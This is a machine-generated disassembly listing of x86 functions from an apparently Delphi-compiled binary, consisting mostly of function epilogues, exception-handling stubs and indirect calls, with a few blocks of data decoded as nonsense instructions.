sub_45a7d0
pop ebp
retn
sub_45a7d4
sub [ rw-data ] 0x1
retn
sub_45a801
jmp sub_40382c
sub_45a808
pop ebp
retn
sub_45a80c
sub [ rw-data ] 0x1
retn
sub_45a839
jmp sub_40382c
sub_45a840
pop ebp
retn
sub_45a844
sub [ rw-data ] 0x1
retn
sub_45aa00
push ebx
mov ebx eax
mov eax ebx
call sub_45921c
mov eax [ ebx + 0x68 ]
test eax eax
je r-xdata
pop ebx
retn
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x20 ]
sub_45ab65
jmp sub_40382c
sub_45ab6c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45ab89
lea eax [ ebp - 0x8 ]
call sub_403eac
retn
sub_45ab82
jmp sub_40382c
sub_45ab89
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_45ad61
jmp sub_40382c
sub_45ad68
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x14
sub_45ad74
mov ecx [ eax + 0x68 ]
test ecx ecx
setne dl
test dl dl
je r-xdata
mov eax edx
retn
mov dl [ ecx + 0x10 ]
sub_45adf4
mov eax [ eax + 0x68 ]
call sub_45a470
retn
sub_45ae70
jmp sub_40382c
sub_45ae77
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_45aef0
jmp sub_40382c
sub_45aef7
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
j_sub_4036a4#2
jmp sub_4036a4
sub_45b0ad
jmp sub_40382c
sub_45b0b4
pop ebp
retn
sub_45b0b8
sub [ rw-data ] 0x1
retn
sub_45b0e5
jmp sub_40382c
sub_45b0ec
pop ebp
retn
sub_45b0f0
sub [ rw-data ] 0x1
retn
sub_45b201
jmp sub_40382c
sub_45b208
pop ebp
retn
sub_45b20c
sub [ rw-data ] 0x1
retn
sub_45b26b
jmp sub_40382c
sub_45b272
mov eax ebx
pop ebx
pop ecx
pop ebp
retn
sub_45b2c2
jmp sub_40382c
sub_45b2c9
mov eax ebx
pop ebx
pop ecx
pop ebp
retn
sub_45b327
jmp sub_40382c
sub_45b32e
mov eax ebx
pop ebx
pop ecx
pop ebp
retn
sub_45bd3f
jmp [ esi ]
sub_45c073
jmp [ eax ]
sub_45c3ab
jmp [ eax ]
sub_45c4e8
push edx
push 0x0
push eax
call [ rw-data ]
add esp 0xc
retn
sub_45c4f8
push 0x0
push eax
call [ rw-data ]
add esp 0x8
retn
sub_45c508
cmp [ rw-data ] 0x0
je r-xdata
retn
call [ rw-data ]
sub_45c544
jmp sub_40382c
sub_45c54b
pop ebp
retn
sub_45c550
sub [ rw-data ] 0x1
retn
sub_45c57d
jmp sub_40382c
sub_45c584
pop ebp
retn
sub_45c588
sub [ rw-data ] 0x1
retn
j_sub_40382c#9
jmp sub_40382c
sub_45c5bc
pop ebp
retn
sub_45c5c0
sub [ rw-data ] 0x1
retn
j_sub_40382c#8
jmp sub_40382c
sub_45c5f4
pop ebp
retn
sub_45c5f8
sub [ rw-data ] 0x1
retn
sub_45c625
jmp sub_40382c
sub_45c62c
pop ebp
retn
sub_45c630
sub [ rw-data ] 0x1
retn
sub_45c65d
jmp sub_40382c
sub_45c664
pop ebp
retn
sub_45c668
sub [ rw-data ] 0x1
retn
j_sub_40382c#7
jmp sub_40382c
sub_45c69c
pop ebp
retn
sub_45c6a0
sub [ rw-data ] 0x1
retn
sub_45ca85
0x45
sub_45cd10
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sub_45d53e
jmp sub_40382c
sub_45d545
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45d567
lea eax [ ebp - 0xc ]
mov edx 0x2
call sub_403ed0
retn
j_sub_40382c#6
jmp sub_40382c
sub_45d567
mov eax [ ebp - 0x4 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_45d64b
jmp sub_40382c
sub_45d652
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45d67c
lea eax [ ebp - 0x14 ]
mov edx 0x2
call sub_403ed0
lea eax [ ebp - 0x4 ]
call sub_403eac
retn
sub_45d675
jmp sub_40382c
sub_45d67c
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_45d6e8
mov eax rw-data
call sub_40cb14
mov eax rw-data
call sub_40cb14
mov eax rw-data
call sub_40cb14
call sub_45c494
retn
j_sub_403578#2
jmp sub_403578
sub_45d86f
jmp sub_40382c
sub_45db06
jmp sub_40382c
sub_45db0d
pop ebx
pop ecx
pop ebp
retn
sub_45db14
push ebx
cmp [ eax + 0x82 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov eax [ ebx + 0x84 ]
call [ ebx + 0x80 ]
sub_45db30
push ebx
mov cl 0x1
cmp [ eax + 0x8a ] 0x0
je r-xdata
mov eax ecx
pop ebx
retn
mov ebx eax
mov eax [ ebx + 0x8c ]
call [ ebx + 0x88 ]
mov ecx eax
j_sub_4036a4
jmp sub_4036a4
sub_45dc88
push ebx
mov ebx eax
lea eax [ ebx + 0x80 ]
call sub_40cb14
cmp [ ebx + 0x84 ] 0x0
jne r-xdata
mov eax ebx
call sub_45aa00
pop ebx
retn
lea eax [ ebx + 0x78 ]
call sub_40cb14
sub_45dcb0
call sub_45adc4
retn
sub_45dcb8
push ebx
cmp [ eax + 0xb0 ] 0x0
je r-xdata
mov ebx [ eax ]
call [ ebx + 0x6c ]
pop ebx
retn
call sub_45ae00
pop ebx
retn
sub_45dcd0
push ebx
cmp [ eax + 0xb0 ] 0x0
je r-xdata
mov ebx [ eax ]
call [ ebx + 0x70 ]
pop ebx
retn
call sub_45ae80
pop ebx
retn
sub_45dce8
mov eax [ eax + 0x80 ]
call sub_45ea8c
retn
sub_45dcf4
mov eax [ eax + 0x80 ]
call sub_45ead8
retn
j_sub_403578
jmp sub_403578
sub_45dd4c
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x40 ]
call sub_40388c
call sub_4038e0
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
j_sub_40382c#5
jmp sub_40382c
sub_45de72
pop ebx
pop ecx
pop ebp
retn
sub_45de78
push ebx
cmp [ eax + 0x92 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov eax [ ebx + 0x94 ]
call [ ebx + 0x90 ]
sub_45de94
push ebx
mov cl 0x1
cmp [ eax + 0x9a ] 0x0
je r-xdata
mov eax ecx
pop ebx
retn
mov ebx eax
mov eax [ ebx + 0x9c ]
call [ ebx + 0x98 ]
mov ecx eax
sub_45def4
push ebx
cmp [ eax + 0xaa ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0xac ]
call [ ebx + 0xa8 ]
sub_45dfa4
jmp sub_40382c
sub_45dfab
mov eax esi
test bl bl
je r-xdata
mov eax esi
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_403454
pop [ fs : 0x0 ]
add esp 0xc
sub_45e268
jmp sub_40382c
sub_45e26f
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_45e4da
jmp sub_40382c
sub_45e4e1
mov eax ebx
pop ebx
pop ecx
pop ecx
pop ebp
retn
j_sub_40382c#4
jmp sub_40382c
sub_45e830
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_45ea1e
jmp sub_40382c
sub_45ea25
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
j_sub_40382c#3
jmp sub_40382c
sub_45ed3b
pop ebp
retn
sub_45ed40
sub [ rw-data ] 0x1
retn
sub_45f009
push 0x6a
out dx eax
xor [ eax + 0x6a ] dl
push 0xffffff82
and ah [ ebp + 0x6a ]
push 0xffffffef
stosb [ edi ]
out dx eax
push 0x6a
push 0xffffff82
0x6a48
sub_45f392
push edi
dec ecx
cmp eax 0x6a387b83
push 0xfffffffa
xor [ eax ] eax
sbb [ ebx ] ecx
aaa
retn 0xc31
sub_45f735
push 0x6a
push 0x2
xchg ebp eax
push 0x6a
push 0x39
cmp al 0x83
retn 0x6a61
sub_45f86a
retn 0x6a6a
sub_46332c
push 0x6a
push 0xffffffe3
das
xchg esi eax
pop ecx
stosb [ edi ]
push ebx
das
xchg esi eax
[ gs : edx - 0x505565d ]
j_sub_40382c#2
jmp sub_40382c
sub_464d90
pop ebp
retn
sub_464f56
retn
j_sub_40382c
jmp sub_40382c
j_sub_464f56
jmp sub_464f56
sub_464f5e
pop ebp
retn
